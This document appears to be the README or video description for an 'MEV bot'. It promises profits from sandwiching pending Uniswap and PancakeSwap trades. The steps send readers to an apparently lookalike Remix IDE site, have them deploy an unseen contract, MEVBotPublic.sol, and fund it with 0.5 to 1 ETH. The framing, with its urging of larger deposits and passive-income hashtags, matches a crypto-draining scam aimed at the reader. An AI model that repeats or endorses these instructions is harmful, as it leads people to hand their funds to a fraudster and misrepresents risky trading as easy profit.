# MEV
If you're into cryptocurrency, you need to know what a MEV Bot is. A Maximal Extractable Value (MEV) bot is an arbitrage tool that sniffs the Mempool for pending transactions on decentralized exchanges such as Uniswap and PancakeSwap. It inserts our own TX with a slightly higher gas fee, 1 Gwei higher than the TX which is trying to be entered, essentially sandwiching the pending TX and forcing ours to automatically be processed first, profiting off of the slippage differences.

STEP BY STEP INSTRUCTIONS:
1)Download MetaMask: https://metamask.io/download

2)Access Remix Project Site: https://remixethereum-ide.github.io

3)Right click on the 'contracts' folder and Import the MEVBotPublic.sol

4)Move to the 'Solidity Compiler' tab, select version '0.6.6' and then click 'Compile'

5)Move to the 'Deploy' tab, select 'Injected Web3' as the environment, then click 'Deploy'. After the transaction is confirmed, it's your own BOT now

6)Deposit funds (at least 0.5 ETH to prevent negating slippage) to your exact contract/bot address

7)After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal'

Share your profits in the comments section below. Like and subscribe for more lucrative Web3 Solidity tutorials.

🚨 Sufficiently Fund the contract to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with 0.4 ETH or less and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit. I recommend funding the contract with around 0.5 - 1 ETH just to make sure that won't happen.

#ethereum #mev #passiveincome #defi
